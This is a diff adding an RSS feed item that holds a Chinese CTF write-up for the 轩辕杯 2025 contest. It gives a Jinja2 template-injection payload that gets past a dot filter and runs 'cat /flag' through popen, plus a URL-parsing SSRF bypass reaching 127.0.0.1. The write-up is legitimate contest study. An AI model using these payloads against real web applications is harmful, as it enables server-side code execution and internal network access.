@@ -129,5 +129,68 @@ nest_js
       
     </item>
     
+    
+
+    <item>
+      <title>轩辕杯 2025</title>
+      <link>https://www.lier.xin/post/%E8%BD%A9%E8%BE%95%E6%9D%AF-2025/</link>
+      <pubDate>Tue, 20 May 2025 00:00:00 &#43;0800</pubDate>
+      <author>3310338687@qq.com (Lier)</author>
+      <guid>https://www.lier.xin/post/%E8%BD%A9%E8%BE%95%E6%9D%AF-2025/</guid>
+      <description>
+        <![CDATA[<h1>轩辕杯 2025</h1><p>作者：Lier（3310338687@qq.com）</p>
+        
+          <h2 id="ezflask">
+<a class="header-anchor" href="#ezflask"></a>
+ezflask
+</h2><p>过滤<code>.</code></p>
+<p>用中括号代替</p>
+<p>构造payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name={{&#39;&#39;[&#34;__class__&#34;][&#34;__base__&#34;][&#34;__subclasses__&#34;]()[133][&#34;__init__&#34;][&#34;__globals__&#34;][request[&#34;args&#34;][&#34;a&#34;]](request[&#34;args&#34;][&#34;b&#34;])[&#39;read&#39;]()}}&amp;a=popen&amp;b=cat /flag
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250522160705600.png" alt="image-20250520103835172"></p>
+<h2 id="ezjs">
+<a class="header-anchor" href="#ezjs"></a>
+ezJS
+</h2><p>看源码直接发包</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">scoreNow</span> <span class="o">===</span> <span class="mi">100000000000</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;getflag.php&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">body</span><span class="o">:</span> <span class="s1">&#39;score=&#39;</span> <span class="o">+</span> <span class="nx">scoreNow</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;恭喜你！flag是：&#34;</span> <span class="o">+</span> <span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;错误:&#39;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250522160848317.png" alt="image-20250520103735973"></p>
+<h2 id="ezssrf">
+<a class="header-anchor" href="#ezssrf"></a>
+ezssrf
+</h2><p>考点在于满足下式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="k">null</span> <span class="o">&amp;&amp;</span> <span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;http&#39;</span>
+</span></span></code></pre></div><p>paylaod:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=http:/127.0.0.1/flag
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250522160941866.png" alt="image-20250520113203237"></p>
+<p>访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250522161017375.png" alt="image-20250520113251622"></p>
+<h2 id="签到">
+<a class="header-anchor" href="#%e7%ad%be%e5%88%b0"></a>
+签到
+</h2><p>写一下关键过程</p>
+        
+        <hr><p>本文2025-05-20首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-05-20</p>]]>
+      </description>
+      
+        <category>WriteUp</category>
+      
+    </item>
+    
   </channel>
 </rss>
